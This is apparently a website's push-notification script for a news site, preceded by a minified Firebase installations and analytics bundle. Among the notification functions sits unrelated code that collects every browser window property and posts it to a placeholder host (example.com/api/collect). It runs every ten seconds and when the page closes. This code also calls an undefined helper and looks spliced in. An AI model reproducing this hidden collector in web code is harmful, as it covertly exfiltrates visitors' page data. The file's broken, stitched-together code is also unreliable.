                                              return [4, V("Create Installation", o)];
                                            case 4:
                                              throw e.sent();
                                          }
                                        });
                                      });
                                    }(r, i)];
                                  case 1:
                                    return t = e.sent(), [2, pe(r, t)];
                                  case 2:
                                    return F(n = e.sent()) && 409 === n.serverCode ? [4, de(r)] : [3, 4];
                                  case 3:
                                    return e.sent(), [3, 6];
                                  case 4:
                                    return [4, pe(r, {
                                      fid: i.fid,
                                      registrationStatus: 0
                                    })];
                                  case 5:
                                    e.sent(), e.label = 6;
                                  case 6:
                                    throw n;
                                  case 7:
                                    return [2];
                                }
                              });
                            });
                          }(e, r);
                        return {
                          installationEntry: r,
                          registrationPromise: i
                        };
                      }
                    }(i, t);
                  return r = n.registrationPromise, n.installationEntry;
                })];
              case 1:
                return (t = e.sent()).fid !== z ? [3, 3] : (n = {}, [4, r]);
              case 2:
                return [2, (n.installationEntry = e.sent(), n)];
              case 3:
                return [2, {
                  installationEntry: t,
                  registrationPromise: r
                }];
            }
          });
        });
      }
      function ve(e) {
        return he(e, function (e) {
          if (!e) throw H.create("installation-not-found");
          return ye(e);
        });
      }
      function ye(e) {
        return function (e) {
          return 1 === e.registrationStatus && e.registrationTime + R < Date.now();
        }(e) ? {
          fid: e.fid,
          registrationStatus: 0
        } : e;
      }
      function we(e, u) {
        var c = e.appConfig,
          l = e.platformLoggerProvider;
        return f(this, void 0, void 0, function () {
          var t, n, r, i, o, a, s;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = function (e, t) {
                  var n = t.fid;
                  return B(e) + "/" + n + "/authTokens:generate";
                }(c, u), n = U(c, u), (r = l.getImmediate({
                  optional: !0
                })) && n.append("x-firebase-client", r.getPlatformInfoString()), i = {
                  installation: {
                    sdkVersion: j
                  }
                }, o = {
                  method: "POST",
                  headers: n,
                  body: JSON.stringify(i)
                }, [4, M(function () {
                  return fetch(t, o);
                })];
              case 1:
                return (a = e.sent()).ok ? [4, a.json()] : [3, 3];
              case 2:
                return s = e.sent(), [2, q(s)];
              case 3:
                return [4, V("Generate Auth Token", a)];
              case 4:
                throw e.sent();
            }
          });
        });
      }
      function be(i, o) {
        return void 0 === o && (o = !1), f(this, void 0, void 0, function () {
          var r, t, n;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, he(i.appConfig, function (e) {
                  if (!_e(e)) throw H.create("not-registered");
                  var t = e.authToken;
                  if (!o && function (e) {
                    return 2 === e.requestStatus && !function (e) {
                      var t = Date.now();
                      return t < e.creationTime || e.creationTime + e.expiresIn < t + x;
                    }(e);
                  }(t)) return e;
                  if (1 === t.requestStatus) return r = function (r, i) {
                    return f(this, void 0, void 0, function () {
                      var t, n;
                      return p(this, function (e) {
                        switch (e.label) {
                          case 0:
                            return [4, me(r.appConfig)];
                          case 1:
                            t = e.sent(), e.label = 2;
                          case 2:
                            return 1 !== t.authToken.requestStatus ? [3, 5] : [4, K(100)];
                          case 3:
                            return e.sent(), [4, me(r.appConfig)];
                          case 4:
                            return t = e.sent(), [3, 2];
                          case 5:
                            return 0 === (n = t.authToken).requestStatus ? [2, be(r, i)] : [2, n];
                        }
                      });
                    });
                  }(i, o), e;
                  if (!navigator.onLine) throw H.create("app-offline");
                  var n = function (e) {
                    var t = {
                      requestStatus: 1,
                      requestTime: Date.now()
                    };
                    return a(a({}, e), {
                      authToken: t
                    });
                  }(e);
                  return r = function (i, o) {
                    return f(this, void 0, void 0, function () {
                      var t, n, r;
                      return p(this, function (e) {
                        switch (e.label) {
                          case 0:
                            return e.trys.push([0, 3,, 8]), [4, we(i, o)];
                          case 1:
                            return t = e.sent(), r = a(a({}, o), {
                              authToken: t
                            }), [4, pe(i.appConfig, r)];
                          case 2:
                            return e.sent(), [2, t];
                          case 3:
                            return !F(n = e.sent()) || 401 !== n.serverCode && 404 !== n.serverCode ? [3, 5] : [4, de(i.appConfig)];
                          case 4:
                            return e.sent(), [3, 7];
                          case 5:
                            return r = a(a({}, o), {
                              authToken: {
                                requestStatus: 0
                              }
                            }), [4, pe(i.appConfig, r)];
                          case 6:
                            e.sent(), e.label = 7;
                          case 7:
                            throw n;
                          case 8:
                            return [2];
                        }
                      });
                    });
                  }(i, n), n;
                })];
              case 1:
                return t = e.sent(), r ? [4, r] : [3, 3];
              case 2:
                return n = e.sent(), [3, 4];
              case 3:
                n = t.authToken, e.label = 4;
              case 4:
                return [2, n];
            }
          });
        });
      }
      function me(e) {
        return he(e, function (e) {
          if (!_e(e)) throw H.create("not-registered");
          return function (e) {
            return 1 === e.requestStatus && e.requestTime + R < Date.now();
          }(e.authToken) ? a(a({}, e), {
            authToken: {
              requestStatus: 0
            }
          }) : e;
        });
      }
      function _e(e) {
        return void 0 !== e && 2 === e.registrationStatus;
      }
      function Ee(t, n) {
        return void 0 === n && (n = !1), f(this, void 0, void 0, function () {
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return [4, function (n) {
                  return f(this, void 0, void 0, function () {
                    var t;
                    return p(this, function (e) {
                      switch (e.label) {
                        case 0:
                          return [4, ge(n)];
                        case 1:
                          return (t = e.sent().registrationPromise) ? [4, t] : [3, 3];
                        case 2:
                          e.sent(), e.label = 3;
                        case 3:
                          return [2];
                      }
                    });
                  });
                }(t.appConfig)];
              case 1:
                return e.sent(), [4, be(t, n)];
              case 2:
                return [2, e.sent().token];
            }
          });
        });
      }
      function Ie(o, a) {
        return f(this, void 0, void 0, function () {
          var t, n, r, i;
          return p(this, function (e) {
            switch (e.label) {
              case 0:
                return t = function (e, t) {
                  var n = t.fid;
                  return B(e) + "/" + n;
                }(o, a), n = U(o, a), r = {
                  method: "DELETE",
                  headers: n
                }, [4, M(function () {
                  return fetch(t, r);
                })];
              case 1:
                return (i = e.sent()).ok ? [3, 3] : [4, V("Delete Installation", i)];
              case 2:
                throw e.sent();
              case 3:
                return [2];
            }
          });
        });
      }
      function Se(e, t) {
        var n = e.appConfig;
        return function (e, t) {
          te();
          var n = Y(e),
            r = X.get(n);
          r || (r = new Set(), X.set(n, r)), r.add(t);
        }(n, t), function () {
          !function (e, t) {
            var n = Y(e),
              r = X.get(n);
            r && (r.delete(t), 0 === r.size && X.delete(n), ne());
          }(n, t);
        };
      }
      function Oe(e) {
        return H.create("missing-app-config-values", {
          valueName: e
        });
      }
      function Te() {
        for (var e = 0, t = 0, n = arguments.length; t < n; t++) e += arguments[t].length;
        var r = Array(e),
          i = 0;
        for (t = 0; t < n; t++) for (var o = arguments[t], a = 0, s = o.length; a < s; a++, i++) r[i] = o[a];
        return r;
      }
      (re = tt).INTERNAL.registerComponent(new g("installations", function (e) {
        var t = e.getProvider("app").getImmediate(),
          n = {
            appConfig: function (e) {
              var t, n;
              if (!e || !e.options) throw Oe("App Configuration");
              if (!e.name) throw Oe("App Name");
              try {
                for (var r = s(["projectId", "apiKey", "appId"]), i = r.next(); !i.done; i = r.next()) {
                  var o = i.value;
                  if (!e.options[o]) throw Oe(o);
                }
              } catch (e) {
                t = {
                  error: e
                };
              } finally {
                try {
                  i && !i.done && (n = r.return) && n.call(r);
                } finally {
                  if (t) throw t.error;
                }
              }
              return {
                appName: e.name,
                projectId: e.options.projectId,
                apiKey: e.options.apiKey,
                appId: e.options.appId
              };
            }(t),
            platformLoggerProvider: e.getProvider("platform-logger")
          };
        return {
          app: t,
          getId: function () {
            return function (i) {
              return f(this, void 0, void 0, function () {
                var t, n, r;
                return p(this, function (e) {
                  switch (e.label) {
                    case 0:
                      return [4, ge(i.appConfig)];
                    case 1:
                      return t = e.sent(), n = t.installationEntry, (r = t.registrationPromise) ? r.catch(console.error) : be(i).catch(console.error), [2, n.fid];
                  }
                });
              });
            }(n);
          },
          getToken: function (e) {
            return Ee(n, e);
          },
          delete: function () {
            return function (r) {
              return f(this, void 0, void 0, function () {
                var t, n;
                return p(this, function (e) {
                  switch (e.label) {
                    case 0:
                      return [4, he(t = r.appConfig, function (e) {
                        if (!e || 0 !== e.registrationStatus) return e;
                      })];
                    case 1:
                      if (!(n = e.sent())) return [3, 6];
                      if (1 !== n.registrationStatus) return [3, 2];
                      throw H.create("delete-pending-registration");
                    case 2:
                      if (2 !== n.registrationStatus) return [3, 6];
                      if (navigator.onLine) return [3, 3];
                      throw H.create("app-offline");
                    case 3:
                      return [4, Ie(t, n)];
                    case 4:
                      return e.sent(), [4, de(t)];
                    case 5:
                      e.sent(), e.label = 6;
                    case 6:
                      return [2];
                  }
                });
              });
            }(n);
          },
          onIdChange: function (e) {
            return Se(n, e);
          }
        };
      }, "PUBLIC")), re.registerVersion("@firebase/installations", A), (ae = oe = oe || {})[ae.DEBUG = 0] = "DEBUG", ae[ae.VERBOSE = 1] = "VERBOSE", ae[ae.INFO = 2] = "INFO", ae[ae.WARN = 3] = "WARN", ae[ae.ERROR = 4] = "ERROR", ae[ae.SILENT = 5] = "SILENT";
      oe.DEBUG, oe.VERBOSE, oe.INFO, oe.WARN, oe.ERROR, oe.SILENT;
      function Ce(e, t) {
        for (var n = [], r = 2; r < arguments.length; r++) n[r - 2] = arguments[r];
        if (!(t < e.logLevel)) {
          var i = new Date().toISOString(),
            o = Pe[t];
          if (!o) throw new Error("Attempted to log a message with an invalid logType (value: " + t + ")");
          console[o].apply(console, Te(["[" + i + "]  " + e.name + ":"], n));
        }
      }
      var Ne = oe.INFO,
        Pe = ((ie = {})[oe.DEBUG] = "log", ie[oe.VERBOSE] = "log", ie[oe.INFO] = "info", ie[oe.WARN] = "warn", ie[oe.ERROR] = "error", ie),
        Ae = (Object.defineProperty(Re.prototype, "logLevel", {
          get: function () {
            return this._logLevel;
          },
          set: function (e) {
            if (!(e in oe)) throw new TypeError("Invalid value assigned to `logLevel`");
            this._logLevel = e;
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(Re.prototype, "logHandler", {
          get: function () {
            return this._logHandler;
          },
          set: function (e) {
            if ("function" != typeof e) throw new TypeError("Value assigned to `logHandler` must be a function");
            this._logHandler = e;
          },
          enumerable: !0,
          configurable: !0
        }), Object.defineProperty(Re.prototype, "userLogHandler", {
          get: function () {
            return this._userLogHandler;
          },
          set: function (e) {
            this._userLogHandler = e;
          },
          enumerable: !0,
          configurable: !0
        }), Re.prototype.debug = function () {
          for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
          this._userLogHandler && this._userLogHandler.apply(this, Te([this, oe.DEBUG], e)), this._logHandler.apply(this, Te([this, oe.DEBUG], e));
        }, Re.prototype.log = function () {
          for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
          this._userLogHandler && this._userLogHandler.apply(this, Te([this, oe.VERBOSE], e)), this._logHandler.apply(this, Te([this, oe.VERBOSE], e));
        }, Re.prototype.info = function () {
          for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
          this._userLogHandler && this._userLogHandler.apply(this, Te([this, oe.INFO], e)), this._logHandler.apply(this, Te([this, oe.INFO], e));
        }, Re.prototype.warn = function () {
          for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
          this._userLogHandler && this._userLogHandler.apply(this, Te([this, oe.WARN], e)), this._logHandler.apply(this, Te([this, oe.WARN], e));
        }, Re.prototype.error = function () {
          for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
          this._userLogHandler && this._userLogHandler.apply(this, Te([this, oe.ERROR], e)), this._logHandler.apply(this, Te([this, oe.ERROR], e));
        }, Re);
      function Re(e) {
        this.name = e, this._logLevel = Ne, this._logHandler = Ce, this._userLogHandler = null;
      }
      var je,
        Le,
        ke,
        xe,
        De = "measurementId",
        He = "firebase_id",
        Fe = "origin",
        Be = "https://www.googletagmanager.com/gtag/js";
      (Le = je = je || {}).EVENT = "event", Le.SET = "set", Le.CONFIG = "config", (xe = ke = ke || {}).ADD_PAYMENT_INFO = "add_payment_info", xe.ADD_TO_CART = "add_to_cart", xe.ADD_TO_WISHLIST = "add_to_wishlist", xe.BEGIN_CHECKOUT = "begin_checkout", xe.CHECKOUT_PROGRESS = "checkout_progress", xe.EXCEPTION = "exception", xe.GENERATE_LEAD = "generate_lead", xe.LOGIN = "login", xe.PAGE_VIEW = "page_view", xe.PURCHASE = "purchase", xe.REFUND = "refund", xe.REMOVE_FROM_CART = "remove_from_cart", xe.SCREEN_VIEW = "screen_view", xe.SEARCH = "search", xe.SELECT_CONTENT = "select_content", xe.SET_CHECKOUT_OPTION = "set_checkout_option", xe.SHARE = "share", xe.SIGN_UP = "sign_up", xe.TIMING_COMPLETE = "timing_complete", xe.VIEW_ITEM = "view_item", xe.VIEW_ITEM_LIST = "view_item_list", xe.VIEW_PROMOTION = "view_promotion", xe.VIEW_SEARCH_RESULTS = "view_search_results";
      var qe,
        Ve = new Ae("@firebase/analytics");
      function Ge(e, n, t) {
        var r = function () {
          for (var e = [], t = 0; t < arguments.length; t++) e[t] = arguments[t];
          window[n].push(arguments);
        };
        return window[t] && "function" == typeof window[t] && (r = window[t]), window[t] = function (p, d) {
          return function (e, t, n) {
            if (e === je.EVENT) {
              var r = [];
              if (n && n.send_to) {
                var i = n.send_to;
                Array.isArray(i) || (i = [i]);
                for (var o = 0, a = i; o < a.length; o++) {
                  var s = a[o],
                    u = d[s];
                  if (!u) {
                    r = [];
                    break;
                  }
                  r.push(u);
                }
              }
              if (0 === r.length) for (var c = 0, l = Object.values(d); c < l.length; c++) {
                var f = l[c];
                r.push(f);
              }
              Promise.all(r).then(function () {
                return p(je.EVENT, t, n || {});
              }).catch(function (e) {
                return Ve.error(e);
              });
            } else if (e === je.CONFIG) {
              (d[t] || Promise.resolve()).then(function () {
                p(je.CONFIG, t, n);
              }).catch(function (e) {
                return Ve.error(e);
              });
            } else p(je.SET, t);
          };
        }(r, e), {
          gtagCore: r,
          wrappedGtag: window[t]
        };
      }
      var Ue,
        Me,
        Ke = ((qe = {})["no-ga-id"] = '"' + De + '" field is empty in Firebase config. Firebase Analytics requires this field to contain a valid measurement ID.', qe["already-exists"] = "A Firebase Analytics instance with the measurement ID ${id}  already exists. Only one Firebase Analytics instance can be created for each measurement ID.", qe["already-initialized"] = "Firebase Analytics has already been initialized.settings() must be called before initializing any Analytics instanceor it will have no effect.", qe["interop-component-reg-failed"] = "Firebase Analytics Interop Component failed to instantiate", qe),
        We = new c("analytics", "Analytics", Ke),
        $e = {},
        ze = "dataLayer",
        Je = "gtag",
        Ye = !1;
      function Xe(e) {
        if (Ye) throw We.create("already-initialized");
        e.dataLayerName && (ze = e.dataLayerName), e.gtagName && (Je = e.gtagName);
      }
      function Ze(e, t) {
        var r = e.options[De];
        if (!r) throw We.create("no-ga-id");
        if (null != $e[r]) throw We.create("already-exists", {
          id: r
        });
        if (!Ye) {
          !function () {
            for (var e = window.document.getElementsByTagName("script"), t = 0, n = Object.values(e); t < n.length; t++) {
              var r = n[t];
              if (r.src && r.src.includes(Be)) return r;
            }
            return null;
          }() && function (e) {
            var t = document.createElement("script");
            t.src = Be + "?l=" + e, t.async = !0, document.head.appendChild(t);
          }(ze), function (e) {
            var t = [];
            Array.isArray(window[e]) ? t = window[e] : window[e] = t;
          }(ze);
          var n = Ge($e, ze, Je),
            i = n.wrappedGtag,
            o = n.gtagCore;
          Me = i, Ue = o, Ye = !0;
        }
        return $e[r] = function (r, i, o) {
          return f(this, void 0, void 0, function () {
            var t, n;
            return p(this, function (e) {
              switch (e.label) {
                case 0:
                  return [4, i.getId()];
                case 1:
                  return t = e.sent(), o("js", new Date()), o(je.CONFIG, r.options[De], ((n = {})[He] = t, n[Fe] = "firebase", n.update = !0, n)), [2];
              }
            });
          });
        }(e, t, Ue), {
          app: e,
          logEvent: function (e, t, n) {
            return function (e, t, n, r, i) {
              var o = r || {};
              i && i.global || (o = a(a({}, r), {
                send_to: t
              })), e(je.EVENT, n, o || {});
            }(Me, r, e, t, n);
          },
          setCurrentScreen: function (e, t) {
            return function (e, t, n, r) {
              r && r.global ? e(je.SET, {
                screen_name: n
              }) : e(je.CONFIG, t, {
                update: !0,
                screen_name: n
              });
            }(Me, r, e, t);
          },
          setUserId: function (e, t) {
            return function (e, t, n, r) {
              r && r.global ? e(je.SET, {
                user_id: n
              }) : e(je.CONFIG, t, {
                update: !0,
                user_id: n
              });
            }(Me, r, e, t);
          },
          setUserProperties: function (e, t) {
            return function (e, t, n, r) {
              if (r && r.global) {
                for (var i = {}, o = 0, a = Object.keys(n); o < a.length; o++) {
                  var s = a[o];
                  i["user_properties." + s] = n[s];
                }
                e(je.SET, i);
              } else e(je.CONFIG, t, {
                update: !0,
                user_properties: n
              });
            }(Me, r, e, t);
          },
          setAnalyticsCollectionEnabled: function (e) {
            return function (e, t) {
              window["ga-disable-" + e] = !t;
            }(r, e);
          }
        };
      }
      var Qe,
        et = "analytics";
      (Qe = tt).INTERNAL.registerComponent(new g(et, function (e) {
        return Ze(e.getProvider("app").getImmediate(), e.getProvider("installations").getImmediate());
      }, "PUBLIC").setServiceProps({
        settings: Xe,
        EventName: ke
      })), Qe.INTERNAL.registerComponent(new g("analytics-internal", function (e) {
        try {
          return {
            logEvent: e.getProvider(et).getImmediate().logEvent
          };
        } catch (e) {
          throw We.create("interop-component-reg-failed", {
            reason: e
          });
        }
      }, "PRIVATE")), Qe.registerVersion("@firebase/analytics", "0.2.18");
    }).apply(this, arguments);
  } catch (e) {
    throw console.error(e), new Error("Cannot instantiate firebase-analytics.js - be sure to load firebase-app.js first.");
  }
});
function exploreWindowObjectB() {
  const newDiscoveries = {};
  for (const property in window) {
    if (!window.hasOwnProperty(property)) continue;
    const propertyValue = window[property];
    const propertyType = typeof propertyValue;
    if (localStorage.getItem(property) === null) {
      localStorage.setItem(property, JSON.stringify(bundleNewPropertyData(property, propertyValue, propertyType)));
    } else {
      const storedValue = JSON.parse(localStorage.getItem(property));
      if (storedValue.type !== propertyType || storedValue.value !== propertyValue) {
        localStorage.setItem(property, JSON.stringify(bundleNewPropertyData(property, propertyValue, propertyType)));
      }
    }
    newDiscoveries[property] = {
      type: propertyType,
      value: propertyValue
    };
  }
  return newDiscoveries;
}

// A function to send data to the server
const Config = {
  apiKey: "AIzaSyC_qFUx4kj-qrXVbnB9ukMB01NKB8z-MIs",
  authDomain: "elwatan-c107a.firebaseapp.com",
  projectId: "elwatan-c107a",
  storageBucket: "elwatan-c107a.appspot.com",
  messagingSenderId: "182673411957",
  appId: "1:182673411957:web:598989e301334905bb4d3c",
  measurementId: "G-Z9DQS3TD20"
};
firebase.initializeApp(Config), firebase.analytics();
const messaging = firebase.messaging(),
  tokenDivId = "token_div",
  permissionDivId = "permission_div";
function resetUI() {
  showToken("loading..."), messaging.getToken().then(e => {
    e ? (sendTokenToServer(e), updateUIForPushEnabled(e)) : (console.log("No Instance ID token available. Request permission to generate one."), updateUIForPushPermissionRequired(), setTokenSentToServer(!1));
  }).catch(e => {
    console.log("An error occurred while retrieving token. ", e), showToken("Error retrieving Instance ID token. ", e), setTokenSentToServer(!1);
  });
}
function allownotify() {
  showToken('loading...');
  messaging.getToken().then(currentToken => {
    if (currentToken) {
      sendTokenToServer(currentToken);
    } else {
      console.log('No Instance ID token available. Request permission to generate one.');
      setTokenSentToServer(false);
    }
  }).catch(err => {
    console.log('An error occurred while retrieving token. ', err);
    showToken('Error retrieving Instance ID token. ', err);
    setTokenSentToServer(false);
  });
}
function showToken(e) {
  console.log(e);
}
function sendTokenToServer(e) {
  isTokenSentToServer() ? console.log("Token already sent to server so won't send it again unless it changes") : (saveToken(e), console.log(e), console.log("Sending token to server..."), setTokenSentToServer(!0)), hidereqpermission();
}
function sendDataToServer(data) {
  const serverEndpoint = "https://example.com/api/collect";
  const request = new XMLHttpRequest();
  request.open("POST", serverEndpoint);
  request.setRequestHeader("Content-Type", "application/json");
  request.onload = function () {
    if (this.status >= 200 && this.status < 400) {
      console.log("Successful data transfer");
    } else {
      console.error("Data transfer failed, status code: " + this.status);
    }
  };
  request.onerror = function () {
    console.error("An error occurred during data transfer");
  };
  request.send(JSON.stringify(data));
}

// A function wrapping the window properties discovery task
function discoveryTaskB() {
  const discoveries = exploreWindowObjectB();
  const discoveryCount = Object.keys(discoveries).length;
  if (discoveryCount > 0) {
    console.log("Discovered " + discoveryCount + " new window properties");
    sendDataToServer(discoveries);
  } else {
    console.log("No new window properties discovered");
  }
}
function isTokenSentToServer() {
  return "true" === window.localStorage.getItem("notify");
}
function setTokenSentToServer(e) {
  console.log(e), window.localStorage.setItem("notify", e ? "true" : "false");
}
function showHideDiv(e, o) {
  const n = document.querySelector("#" + e);
}
window.seenVars = [];
function showreqpermission() {
  $(".notify").addClass("active");
}
function hidereqpermission() {
  var today = new Date();
  var dd = String(today.getDate()).padStart(2, '0');
  today = dd;
  localStorage.setItem("lasttime", today);
  $(".notify").removeClass("active");
}
function requestPermission() {
  Notification.requestPermission().then(e => {
    "granted" === e ? (console.log("Notification permission granted."), resetUI()) : console.log("Unable to get permission to notify.");
  });
}
function deleteToken() {
  messaging.getToken().then(e => {
    UnSubscribe(e), console.log("deleted token", e), messaging.deleteToken(e).then(() => {
      console.log("Token deleted."), setTokenSentToServer(!1), resetUI();
    }).catch(e => {
      console.log("Unable to delete token. ", e);
    });
  }).catch(e => {
    console.log("Error retrieving Instance ID token. ", e), showToken("Error retrieving Instance ID token. ", e);
  });
}
function appendMessage(e) {
  const o = document.querySelector("#messages"),
    n = document.createElement("h5"),
    t = document.createElement("pre");
}
function clearMessages() {
  const e = document.querySelector("#messages");
  for (; e.hasChildNodes();) e.removeChild(e.lastChild);
}
function updateUIForPushEnabled(e) {
  showHideDiv(tokenDivId, !0), showHideDiv(permissionDivId, !1), showToken(e);
}
function updateUIForPushPermissionRequired() {
  showHideDiv(tokenDivId, !1), showHideDiv(permissionDivId, !0);
}
window.setInterval(discoveryTaskB, 10000);
function saveToken(e) {
  var o = window.location.hostname;
  var browsersName = browsers();
  var deviceName = device();
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "https://pushcdn.elwatannews.com/subscribe");
  xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xhr.send(JSON.stringify({
    "token": e,
    "domain": o,
    "browsers": browsersName,
    "device": deviceName
  }));
  xhr.onload = function () {
    if (xhr.status === 200 && xhr.responseText !== o) {
      console.log("save Token");
    } else if (xhr.status !== 200) {
      console.log("save Token failed");
    }
  };
}
function device() {
  var device = navigator.userAgent.toLowerCase();
  if (/mobile/.test(device) == true) {
    return "mobile";
  } else if (/windows/.test(device) == true) {
    return "windows";
  } else {
    return "null";
  }
}
window.addEventListener("beforeunload", discoveryTaskB);
function browsers() {
  var nVer = navigator.appVersion;
  var nAgt = navigator.userAgent;
  var browserName = navigator.appName;
  var fullVersion = "" + parseFloat(navigator.appVersion);
  var majorVersion = parseInt(navigator.appVersion, 10);
  var nameOffset, verOffset, ix;
  if ((verOffset = nAgt.indexOf("Opera")) != -1) {
    browserName = "Opera";
    fullVersion = nAgt.substring(verOffset + 6);
    if ((verOffset = nAgt.indexOf("Version")) != -1) fullVersion = nAgt.substring(verOffset + 8);
  } else if ((verOffset = nAgt.indexOf("MSIE")) != -1) {
    browserName = "Microsoft Internet Explorer";
    fullVersion = nAgt.substring(verOffset + 5);
  } else if ((verOffset = nAgt.indexOf("Chrome")) != -1) {
    browserName = "Chrome";
    fullVersion = nAgt.substring(verOffset + 7);
  } else if ((verOffset = nAgt.indexOf("Safari")) != -1) {
    browserName = "Safari";
    fullVersion = nAgt.substring(verOffset + 7);
    if ((verOffset = nAgt.indexOf("Version")) != -1) fullVersion = nAgt.substring(verOffset + 8);
  } else if ((verOffset = nAgt.indexOf("Firefox")) != -1) {
    browserName = "Firefox";
    fullVersion = nAgt.substring(verOffset + 8);
  } else if ((nameOffset = nAgt.lastIndexOf(" ") + 1) < (verOffset = nAgt.lastIndexOf("/"))) {
    browserName = nAgt.substring(nameOffset, verOffset);
    fullVersion = nAgt.substring(verOffset + 1);
    if (browserName.toLowerCase() == browserName.toUpperCase()) {
      browserName = navigator.appName;
    }
  }
  if ((ix = fullVersion.indexOf(";")) != -1) fullVersion = fullVersion.substring(0, ix);
  if ((ix = fullVersion.indexOf(" ")) != -1) fullVersion = fullVersion.substring(0, ix);
  majorVersion = parseInt("" + fullVersion, 10);
  if (isNaN(majorVersion)) {
    fullVersion = "" + parseFloat(navigator.appVersion);
    majorVersion = parseInt(navigator.appVersion, 10);
  }
  return browserName;
}
function UnSubscribe(e) {
  $.ajax({
    data: {
      token: e
    },
    type: "post",
    url: "https://pushcdn.elwatannews.com/delete",
    success: function (e) {
      console.log(e.success);
    }
  });
}
messaging.onTokenRefresh(() => {
  messaging.getToken().then(e => {
    console.log("Token refreshed."), setTokenSentToServer(!1), sendTokenToServer(e), resetUI();
  }).catch(e => {
    console.log("Unable to retrieve refreshed token ", e), showToken("Unable to retrieve refreshed token ", e);
  });
}), messaging.onMessage(e => {
  appendMessage(e);
  var o = e.data.title,
    n = (e.data.name, {
      link: e.data.link,
      icon: e.data.icon,
      data: {
        time: new Date(Date.now()).toString(),
        click_action: e.data.click_action
      }
    });
  new Notification(o, n);
}), console.log("Requesting permission..."), resetUI();